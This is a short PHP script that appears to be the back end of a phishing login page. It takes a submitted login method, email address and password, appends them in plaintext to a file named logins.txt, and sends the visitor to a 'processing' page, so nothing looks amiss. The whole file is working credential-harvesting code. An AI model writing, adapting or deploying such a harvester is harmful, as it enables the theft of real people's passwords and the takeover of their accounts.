<?php
// Capture the data sent from the form
$loginMethod = $_POST['method'];
$email = $_POST['email'];
$password = $_POST['password'];

// Prepare the data for storage
$data = "Login Method: $loginMethod | Email: $email | Password: $password\n";

// Save the data to a file
$file = fopen("logins.txt", "a"); // Open logins.txt in append mode
fwrite($file, $data);
fclose($file);

// Redirect to processing.html
header("Location: processing.html");
exit();
?>